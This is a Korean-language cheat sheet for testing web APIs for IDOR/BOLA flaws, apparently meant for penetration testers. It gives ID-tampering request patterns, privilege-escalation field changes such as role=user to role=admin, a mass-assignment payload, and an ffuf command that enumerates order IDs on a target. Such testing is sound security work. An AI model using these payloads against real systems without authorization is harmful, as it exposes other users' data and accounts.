# IDOR / BOLA — 인증 없는 객체 접근

## 기본 테스트
```
# 숫자 ID 변조
GET /api/users/1234/profile  → /api/users/1235/profile
GET /api/orders/1234         → /api/orders/1233

# UUID 치환 (다른 계정 UUID로)
GET /api/profile/a1b2c3d4-...  → 다른 사용자 UUID

# 문자열 ID
GET /api/docs/my_doc         → /api/docs/admin_doc
GET /download?file=user1.pdf → /download?file=user2.pdf
```

## 파라미터 위치 변형
```
# 쿼리 파라미터
GET /api/data?user_id=1234

# 경로 파라미터
GET /api/1234/data

# 바디 파라미터 (POST)
{"user_id": 1234}

# 헤더
X-User-ID: 1234
X-Account-ID: 1234

# 쿠키
Cookie: user_id=1234
```

## 권한 상승 패턴
```
# 일반 → 관리자
role=user → role=admin
user_type=0 → user_type=1
is_admin=false → is_admin=true

# 계정 간 데이터 접근
자신의 user_id 를 타인의 user_id 로 변경

# Horizontal → Vertical
같은 권한 레벨의 다른 계정 접근 → 더 높은 권한 계정 접근
```

## HTTP 메서드 기반
```
# 읽기 허용 → 쓰기/삭제 시도
GET /api/users/1234  (허용)
PUT /api/users/1234  (시도)
DELETE /api/users/1234 (시도)
PATCH /api/users/1234 (시도)
```

## Mass Assignment
```
# 서버가 모든 JSON 필드를 모델에 바인딩할 때
POST /api/users/profile
{
  "name": "attacker",
  "role": "admin",           ← 원래 수정 불가 필드
  "is_verified": true,       ← 원래 수정 불가 필드
  "balance": 999999          ← 원래 수정 불가 필드
}
```

## 간접 객체 참조 발굴
```bash
# 1. Burp Suite Intruder로 숫자 ID 순열
# 2. ffuf로 ID 범위 스캔
ffuf -u "https://target/api/orders/FUZZ" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer <your_token>" \
  -mc 200 -o results.json

# 3. 응답 크기 차이로 존재 여부 판단
# 200 + body 있음 → 존재
# 403/404/401 → 없거나 권한 없음

# 4. 자신 계정 ID 기준 ±100 범위 탐색
```

## 실전 체크리스트
```
□ 문서/파일 다운로드 엔드포인트
□ 프로필/계정 조회 API
□ 주문/거래 내역 조회
□ 관리자 전용 API (/admin, /management)
□ 이메일 변경 / 비밀번호 리셋 플로우
□ 첨부파일 / 이미지 URL
□ 내보내기 (PDF/CSV 생성) 기능
□ 알림 / 메시지 조회
□ 공유 링크 생성 (다른 사람 링크 접근)
```

## Burp Suite IDOR 자동화
```python
# Burp Extender (Python) - 자동 ID 변형
# Autorize 플러그인 사용
# 1. 두 계정으로 동시 로그인
# 2. Autorize 에 낮은 권한 계정 쿠키 등록
# 3. 높은 권한 계정으로 브라우징
# 4. Autorize 가 낮은 권한 쿠키로 동일 요청 재전송
# 5. 응답이 동일하면 IDOR 존재
```
